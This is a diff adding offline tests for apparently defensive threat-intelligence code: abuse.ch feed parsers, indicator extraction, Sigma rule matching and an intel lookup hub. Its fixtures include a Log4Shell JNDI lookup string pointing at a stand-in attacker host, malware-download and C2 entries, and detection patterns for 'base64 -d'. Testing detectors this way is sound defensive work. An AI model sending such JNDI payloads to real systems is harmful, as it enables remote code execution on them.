@@ -248,6 +248,168 @@ test('nmap XML becomes asset rows with services, packages and OS', () => {
   assert.ok(exposureFor(web, httpd).exposed, 'scanned Apache 2.4.49 should match CVE-2021-41773');
 });
 
+// ---- Threat feeds, indicators, Sigma (all offline, inline fixtures) ---------------
+const zlib = require('zlib');
+const { parseCsvRow, unzip, FeedCache } = require('../src/intel/feeds');
+const { classify, extractAll, fromPayload, registered } = require('../src/intel/indicator');
+const { parseThreatFox, parseUrlhaus, parseBazaar, parseFeodo, AbuseCh } = require('../src/intel/abusech');
+const { parseHashes, md5 } = require('../src/intel/misp');
+const { compileRule, scanWith, toAlerts, webEvent, processEvent, parseBundle } = require('../src/engine/sigma');
+const { createHub } = require('../src/intel/hub');
+
+// A minimal zip writer (deflate) so the reader is tested against a real archive layout.
+function makeZip(files) {
+  const locals = []; const central = []; let off = 0;
+  for (const [name, text] of files) {
+    const raw = Buffer.from(text); const data = zlib.deflateRawSync(raw); const n = Buffer.from(name);
+    const lh = Buffer.alloc(30); lh.writeUInt32LE(0x04034b50, 0); lh.writeUInt16LE(8, 8); lh.writeUInt32LE(data.length, 18); lh.writeUInt32LE(raw.length, 22); lh.writeUInt16LE(n.length, 26);
+    const ch = Buffer.alloc(46); ch.writeUInt32LE(0x02014b50, 0); ch.writeUInt16LE(8, 10); ch.writeUInt32LE(data.length, 20); ch.writeUInt32LE(raw.length, 24); ch.writeUInt16LE(n.length, 28); ch.writeUInt32LE(off, 42);
+    locals.push(lh, n, data); central.push(ch, n); off += 30 + n.length + data.length;
+  }
+  const cd = Buffer.concat(central);
+  const end = Buffer.alloc(22); end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(files.length, 8); end.writeUInt16LE(files.length, 10); end.writeUInt32LE(cd.length, 12); end.writeUInt32LE(off, 16);
+  return Buffer.concat([...locals, cd, end]);
+}
+
+const TF_CSV = `# ThreatFox export
+"2026-10-16 08:00:00", "1601", "50.16.16.211:443", "ip:port", "botnet_cc", "win.qakbot", "QakBot", "QakBot", "None", "100", "None", "None", "qakbot,c2", "0", "abuse_ch"
+"2026-10-16 09:00:00", "1602", "n.88mdc.org", "domain", "botnet_cc", "win.vidar", "None", "Vidar", "None", "100", "None", "None", "vidar", "0", "someone"
+"2026-10-15 07:00:00", "1603", "http://evil.example/p.exe", "url", "payload_delivery", "win.remcos", "None", "Remcos", "None", "50", "None", "None", "None", "0", "r"`;
+
+test('feeds: CSV rows with quotes and ", " separators', () => {
+  assert.deepStrictEqual(parseCsvRow('"a", "b,c", "d ""q"""'), ['a', 'b,c', 'd "q"']);
+  assert.deepStrictEqual(parseCsvRow('1,2,,4'), ['1', '2', '', '4']);
+});
+
+test('feeds: zip reader inflates entries', () => {
+  const z = makeZip([['x/full.csv', TF_CSV], ['readme.txt', 'hello']]);
+  const e = unzip(z);
+  assert.deepStrictEqual(e.map((x) => x.name), ['x/full.csv', 'readme.txt']);
+  assert.strictEqual(e[1].data().toString(), 'hello');
+  assert.throws(() => unzip(Buffer.from('not a zip')), /not a zip/);
+});
+
+test('abuse.ch: ThreatFox (zipped), URLhaus, MalwareBazaar and Feodo parsers', () => {
+  const tf = parseThreatFox(makeZip([['full.csv', TF_CSV]]));
+  assert.strictEqual(tf.rows, 3);
+  assert.strictEqual(tf.ip.get('50.16.16.211')[0].port, 443);
+  assert.strictEqual(tf.domain.get('n.88mdc.org')[0].malware, 'Vidar');
+  assert.ok(tf.urlHost.get('evil.example'));
+  const uh = parseUrlhaus('# x\n"1","2026-10-16 10:00:00","http://182.121.159.82:36890/bin.sh","online","2026-10-16","malware_download","Mozi,elf","https://urlhaus.abuse.ch/url/1/","r"');
+  assert.strictEqual(uh.rows, 1);
+  assert.strictEqual(uh.host.get('182.121.159.82')[0].status, 'online');
+  const mb = parseBazaar(`"2026-10-16 10:00:00", "${'a'.repeat(64)}", "${'b'.repeat(32)}", "${'c'.repeat(40)}", "r", "x.exe", "exe", "application/x-dosexec", "AgentTesla", "n/a", "n/a"`);
+  assert.strictEqual(mb.hash.get('b'.repeat(32)).signature, 'AgentTesla');
+  const fe = parseFeodo(JSON.stringify([{ ip_address: '50.16.16.211', port: 443, status: 'online', malware: 'QakBot', as_number: 14618 }]));
+  assert.strictEqual(fe.ip.get('50.16.16.211').asn, 'AS14618');
+});
+
+test('indicators: classification, defanging and extraction', () => {
+  assert.strictEqual(classify('hxxps://bad[.]top/x?a=1').type, 'url');
+  assert.strictEqual(classify('8.8.8.8').type, 'ipv4');
+  assert.strictEqual(classify('8.8.8.8:443').port, 443);
+  assert.strictEqual(classify('AS15169').type, 'asn');
+  assert.strictEqual(classify('44d88612fea8a8f36de82e1278abb02f').type, 'md5');
+  assert.strictEqual(classify('a'.repeat(64)).type, 'sha256');
+  assert.strictEqual(classify('Update.Shop-Mail.co.uk').value, 'update.shop-mail.co.uk');
+  assert.strictEqual(classify('not an indicator'), null);
+  assert.strictEqual(registered('a.b.shop-mail.co.uk'), 'shop-mail.co.uk');
+  const got = extractAll('blocked 203.0.113[.]7 and evil-cdn[.]xyz, sha 44d88612fea8a8f36de82e1278abb02f').map((i) => i.type).sort();
+  assert.deepStrictEqual(got, ['domain', 'ipv4', 'md5']);
+});
+
+test('indicators: pulled from captured payloads', () => {
+  const p = fromPayload('GET /?x=${jndi:ldap://cb.attacker-dns.net:1389/a} HTTP/1.1\r\nHost: shop.acme-retail.com\r\n');
+  assert.ok(p.some((i) => i.value === 'cb.attacker-dns.net' && /JNDI/i.test(i.where)), JSON.stringify(p));
+});
+
+test('MISP: hashed attribute index', () => {
+  const m = parseHashes(`${md5('95.179.213.0')},ev-1\n${md5('95.179.213.0')},ev-2\nbad line\n`);
+  assert.deepStrictEqual(m.get(md5('95.179.213.0')), ['ev-1', 'ev-2']);
+});
+
+const sigmaRule = (detection, logsource = { category: 'webserver' }, extra = {}) => compileRule({ title: 'T', id: 'r1', level: 'high', tags: ['attack.initial-access', 'attack.t1190', 'cve.2021-44228'], logsource, detection, ...extra }, 'rules/web/t.yml');
+const webLine = (uri, ua = 'curl/8') => ({ log_type: 'http_access', host_ip: '10.0.0.5', client_ip: '198.51.100.7', logged_at: '2026-10-17T10:00:00Z', raw_entry: `198.51.100.7 - - [17/Oct/2026:10:00:00 +0000] "GET ${uri} HTTP/1.1" 200 12 "-" "${ua}"` });
+
+test('sigma: modifiers, conditions and keywords', () => {
+  const ev = webEvent(webLine('/a?q=%24%7Bjndi%3Aldap%3A%2F%2Fx%7D'));
+  const r = sigmaRule({ sel: { 'cs-uri-query|contains': ['${jndi:'] }, condition: 'sel' });
+  assert.ok(r.match(ev), 'decoded URI matched');
+  assert.strictEqual(r.technique, 'T1190');
+  assert.strictEqual(r.cve, 'CVE-2021-44228');
+  const all = sigmaRule({ sel: { 'cs-uri-query|contains|all': ['jndi', 'ldap'] }, condition: 'sel' });
+  assert.ok(all.match(ev));
+  const notR = sigmaRule({ a: { 'cs-uri-query|startswith': '/a' }, f: { 'cs-user-agent|endswith': 'curl/8' }, condition: 'a and not f' });
+  assert.ok(!notR.match(ev));
+  const oneOf = sigmaRule({ s1: { 'cs-uri-query|re': 'zzz' }, s2: { 'cs-method': 'GET' }, condition: '1 of s*' });
+  assert.ok(oneOf.match(ev));
+  const kw = sigmaRule({ keywords: ['base64 -d'], condition: 'keywords' }, { product: 'linux' });
+  assert.strictEqual(kw.target, 'linux');
+  assert.throws(() => sigmaRule({ sel: { x: 1 }, timeframe: '5m', condition: 'sel | count() > 5' }));
+});
+
+test('sigma: process events from sudo and auditd, and alert grouping', () => {
+  const pe = processEvent({ log_type: 'auth_log', raw_entry: 'sudo: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/base64 -d /tmp/x' });
+  const rule = sigmaRule({ sel: { 'CommandLine|contains': 'base64 -d' }, condition: 'sel' }, { product: 'linux', category: 'process_creation' });
+  const lines = [
+    { log_type: 'auth_log', host_ip: '10.0.0.5', logged_at: '2026-10-17T10:00:00Z', raw_entry: 'sudo: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/base64 -d /tmp/x' },
+    { log_type: 'system', host_ip: '10.0.0.5', logged_at: '2026-10-17T10:00:01Z', raw_entry: 'type=EXECVE msg=audit(1760695201.1:9): argc=3 a0="base64" a1="-d" a2="/tmp/y"' },
+    { log_type: 'auth_log', host_ip: '10.0.0.5', logged_at: '2026-10-17T10:00:02Z', raw_entry: 'sudo: bob : COMMAND=/usr/bin/ls' }
+  ];
+  const m = scanWith([rule], lines);
+  assert.strictEqual(m.length, 2);
+  const a = toAlerts(m);
+  assert.strictEqual(a.length, 1);
+  assert.strictEqual(a[0].sensor, 'sigma');
+  assert.match(a[0].external_ref, /^sigma:r1 CVE-2021-44228$/);
+  assert.match(a[0].signature, /\(2 lines\)/);
+  assert.strictEqual(scanWith([rule], lines, { minLevel: 'critical' }).length, 0);
+  assert.strictEqual(scanWith([rule], lines, { disabled: ['r1'] }).length, 0);
+});
+
+test('sigma: rule bundle from a SigmaHQ-style archive', () => {
+  const yml = 'title: Log4j probe\nid: 11111111-2222-3333-4444-555555555555\nlevel: critical\nlogsource:\n  category: webserver\ndetection:\n  sel:\n    cs-uri-query|contains: "${jndi:"\n  condition: sel\n';
+  const win = 'title: Windows only\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  sel:\n    Image: x\n  condition: sel\n';
+  const b = parseBundle(makeZip([['sigma_all_rules/version.txt', 'Label: r2026-04-01\n'], ['sigma_all_rules/rules/web/a.yml', yml], ['sigma_all_rules/rules/windows/b.yml', win]]));
+  assert.strictEqual(b.version, 'r2026-04-01');
+  assert.strictEqual(b.rules.length, 1);
+  assert.ok(b.rules[0].match(webEvent(webLine('/?a=${jndi:ldap://x/a}'))));
+});
+
+test('intel hub: one lookup folds abuse.ch, RDAP and passive DNS into a verdict', async () => {
+  const today = new Date(Date.now() - 5 * 86400000).toISOString();
+  const routes = [
+    [/threatfox\.abuse\.ch/, () => makeZip([['full.csv', TF_CSV]])],
+    [/urlhaus\.abuse\.ch/, () => '# none\n'],
+    [/data\.iana\.org\/rdap\/dns\.json/, () => JSON.stringify({ services: [[['org'], ['https://rdap.example-registry.test/']]] })],
+    [/rdap\.example-registry\.test\/domain\//, () => JSON.stringify({ ldhName: '88mdc.org', events: [{ eventAction: 'registration', eventDate: today }], entities: [{ roles: ['registrar'], vcardArray: ['vcard', [['fn', {}, 'text', 'Test Registrar']]] }] })],
+    [/api\.mnemonic\.no/, () => JSON.stringify({ count: 1, data: [{ query: 'n.88mdc.org', answer: '203.0.113.9', rrtype: 'a', times: 3, firstSeenTimestamp: Date.now() - 86400000, lastSeenTimestamp: Date.now() }] })],
+    [/crt\.sh/, () => '[]'],
+    [/botvrij\.eu/, () => { throw new Error('offline in test'); }]
+  ];
+  const fetchImpl = async (url) => {
+    const r = routes.find(([re]) => re.test(url));
+    if (!r) return { ok: false, status: 404, text: async () => '', json: async () => ({}), arrayBuffer: async () => new ArrayBuffer(0) };
+    const body = r[1]();
+    const buf = Buffer.isBuffer(body) ? body : Buffer.from(body);
+    return { ok: true, status: 200, text: async () => buf.toString(), json: async () => JSON.parse(buf.toString()), arrayBuffer: async () => buf.buffer.slice(buf.byteOffset, buf.byteOffset + buf.length) };
+  };
+  const hub = createHub({ env: {}, fetchImpl, offline: false });
+  const r = await hub.lookup('hxxp://n.88mdc[.]org/gate');
+  assert.strictEqual(r.indicator.type, 'url');
+  assert.strictEqual(r.verdict, 'malicious');
+  assert.strictEqual(r.c2, true);
+  assert.deepStrictEqual(r.families, ['Vidar']);
+  assert.strictEqual(r.whois.registrar, 'Test Registrar');
+  assert.ok(r.whois.fresh, 'five-day-old domain flagged as new');
+  assert.strictEqual(r.pdns.records[0].answer, '203.0.113.9');
+  assert.ok(r.sources_failed.some((f) => f.source === 'MISP OSINT'), 'a failing source is reported, not hidden');
+  const clean = await hub.lookup('8.8.4.4');
+  assert.notStrictEqual(clean.verdict, 'malicious');
+  await assert.rejects(hub.lookup('???'), (e) => e.status === 400);
+  const off = createHub({ env: {}, offline: true });
+  assert.strictEqual((await off.lookup('example.org')).skipped, true);
+});
 (async () => {
   let failed = 0;
   for (const [name, fn] of tests) {
